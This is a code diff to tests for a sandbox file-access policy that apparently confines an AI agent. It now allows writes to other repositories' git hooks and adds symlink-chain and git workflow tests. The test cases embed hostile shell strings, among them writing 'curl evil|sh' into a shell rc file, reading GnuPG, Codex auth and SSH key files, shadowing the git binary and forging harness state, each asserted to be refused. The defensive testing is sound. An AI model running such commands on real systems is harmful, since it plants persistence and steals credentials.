@@ -89,7 +89,7 @@ describe("broad-write policy compilation", () => {
         assert.equal(remove(join(home, ".gradle", "caches", "8.14")).allowed, true);
         assert.equal(remove(join(home, ".gradle")).allowed, false, "~/.gradle holds init.d, which runs later");
         assert.equal(write(join(home, ".gradle", "init.d", "evil.gradle")), false);
-        assert.equal(write(join(home, "projects", "other-repo", ".git", "hooks", "pre-commit")), false, "any repo's hooks");
+        assert.equal(write(join(home, "projects", "other-repo", ".git", "hooks", "pre-commit")), true, "git hooks are not protected (ADR 0008)");
         assert.equal(write(join(home, "projects", "other-repo", ".git", "config")), true);
         assert.equal(write(join(home, ".local", "bin", "git")), false);
         assert.equal(evaluateReadAccess(join(home, ".gnupg", "private-keys-v1.d", "k.key"), policy).allowed, false);
@@ -409,25 +409,84 @@ describe("broad-write profile (real kernel)", { skip: !macKernel && !linuxKernel
         assert.equal(readFileSync(join(home, "state", "registry", "sa_1.json"), "utf8"), "{}");
     }));
 
-    it("protects the extended fixed list: GnuPG, Codex auth, user bin dirs and any repository's git hooks", () => fixture((paths) => {
-        const { home, sibling } = paths;
+    it("protects the extended fixed list: GnuPG, Codex auth and user bin dirs", () => fixture((paths) => {
+        const { home } = paths;
         mkdirSync(join(home, ".gnupg"));
         writeFileSync(join(home, ".gnupg", "secring"), "synthetic-secret");
         mkdirSync(join(home, ".codex"));
         writeFileSync(join(home, ".codex", "auth.json"), "synthetic-secret");
         mkdirSync(join(home, ".local", "bin"), { recursive: true });
-        mkdirSync(join(sibling, ".git", "hooks"), { recursive: true });
         for (const [script, label] of [
             [`cat '${home}/.gnupg/secring'`, "read GnuPG"],
             [`cat '${home}/.codex/auth.json'`, "read Codex auth"],
             [`printf x > '${home}/.local/bin/git'`, "shadow a command in ~/.local/bin"],
-            [`printf x > '${sibling}/.git/hooks/pre-commit'`, "plant a hook in a sibling repo"],
         ] as const) {
             const result = run(paths, script);
             assert.notEqual(result.status, 0, `${label} must be refused: ${output(result)}`);
             assert.doesNotMatch(result.stdout ?? "", /synthetic-secret/, label);
         }
-        assert.equal(existsSync(join(sibling, ".git", "hooks", "pre-commit")), false);
+    }));
+
+    it("follows every hop of a symlink chain: 2- and 3-hop file and directory links", () => fixture((paths) => {
+        const { home } = paths;
+        mkdirSync(join(home, ".dotfiles"));
+        mkdirSync(join(home, ".stow", "inner"), { recursive: true });
+        mkdirSync(join(home, "dotfiles", "ssh"), { recursive: true });
+        writeFileSync(join(home, "dotfiles", "zshrc"), "# rc");
+        writeFileSync(join(home, "dotfiles", "ssh", "id_ed25519"), "synthetic-secret");
+        mkdirSync(join(home, ".cache"));
+        mkdirSync(join(home, "state", "registry"), { recursive: true });
+        writeFileSync(join(home, "state", "registry", "sa_1.json"), "{}");
+        // 2 hops (file): ~/.zshrc -> ~/.dotfiles/zshrc -> ~/dotfiles/zshrc
+        symlinkSync(join(home, "dotfiles", "zshrc"), join(home, ".dotfiles", "zshrc"));
+        symlinkSync(join(home, ".dotfiles", "zshrc"), join(home, ".zshrc"));
+        // 3 hops (directory, one relative): ~/.ssh -> ~/.dotfiles/ssh -> ../.stow/inner/ssh -> ~/dotfiles/ssh
+        symlinkSync(join(home, "dotfiles", "ssh"), join(home, ".stow", "inner", "ssh"));
+        symlinkSync("../.stow/inner/ssh", join(home, ".dotfiles", "ssh"));
+        symlinkSync(join(home, ".dotfiles", "ssh"), join(home, ".ssh"));
+        // 2 hops to harness state: ~/.cache/registry -> ~/.cache/hop -> ~/state/registry
+        symlinkSync(join(home, "state", "registry"), join(home, ".cache", "hop"));
+        const registry = join(home, ".cache", "registry");
+        symlinkSync(join(home, ".cache", "hop"), registry);
+        const cases: [string, string][] = [
+            [`rm '${home}/.dotfiles/zshrc' && printf 'curl evil|sh' > '${home}/.dotfiles/zshrc'`, "replace the middle hop of an rc chain"],
+            [`mv '${home}/.dotfiles' '${home}/.dotfiles-old' && mkdir '${home}/.dotfiles' && printf evil > '${home}/.dotfiles/zshrc'`, "move the directory holding a hop"],
+            [`rm '${home}/.stow/inner/ssh' && mkdir '${home}/.stow/inner/ssh' && printf x > '${home}/.stow/inner/ssh/config'`, "replace the third hop of a credential chain"],
+            [`rm '${home}/.dotfiles/ssh' && ln -s '${home}/.cache' '${home}/.dotfiles/ssh'`, "retarget the second hop of a credential chain"],
+            [`cat '${home}/.stow/inner/ssh/id_ed25519'`, "read a credential through a hop"],
+            [`rm '${home}/.cache/hop' && mkdir '${home}/.cache/hop' && printf forged > '${home}/.cache/hop/sa_1.json'`, "replace a hop to harness state"],
+        ];
+        for (const [script, label] of cases) {
+            const result = run(paths, script, broad, [registry]);
+            assert.notEqual(result.status, 0, `${label} must be refused: ${output(result)}`);
+            assert.doesNotMatch(result.stdout ?? "", /synthetic-secret/, label);
+        }
+        for (const link of [".zshrc", ".dotfiles/zshrc", ".ssh", ".dotfiles/ssh", ".stow/inner/ssh", ".cache/hop", ".cache/registry"]) {
+            assert.equal(lstatSync(join(home, link)).isSymbolicLink(), true, link);
+        }
+        assert.equal(readFileSync(join(home, ".zshrc"), "utf8"), "# rc");
+        assert.equal(readFileSync(join(home, "state", "registry", "sa_1.json"), "utf8"), "{}");
+    }));
+
+    it("lets git init, clone and worktree add work in the workspace and a worktree folder", () => fixture((paths) => {
+        const git = (cwd: string, args: string[]) => spawnSync("git", args, { cwd, encoding: "utf8", env: { PATH: "/usr/bin:/bin", HOME: paths.home } });
+        const source = join(paths.base, "source");
+        mkdirSync(source);
+        for (const args of [["init", "-q"], ["-c", "user.name=a", "-c", "user.email=a@b", "commit", "-q", "--allow-empty", "-m", "m"]]) {
+            assert.equal(git(source, args).status, 0);
+        }
+        mkdirSync(join(paths.home, ".cache"));
+        const worktrees = join(paths.home, "projects", "task-worktrees");
+        mkdirSync(worktrees);
+        const commit = "git -c user.name=a -c user.email=a@b -c commit.gpgsign=false commit -qm m";
+        const result = run(paths, [
+            `git init -q && printf x > f && git add f && ${commit}`,
+            `git clone -q '${source}' cloned && cd cloned && printf y > g && git add g && ${commit} && cd ..`,
+            `git worktree add -q '${join(worktrees, "feature")}' && cd '${join(worktrees, "feature")}' && printf z > h && git add h && ${commit}`,
+            `cd '${worktrees}' && mkdir fresh && cd fresh && git init -q && printf w > w && git add w && ${commit}`,
+        ].join(" && "));
+        assert.equal(result.status, 0, output(result));
+        assert.equal(existsSync(join(worktrees, "feature", "h")), true);
     }));
 
     it("restores removal wherever writes are allowed with Write & delete", () => fixture((paths) => {
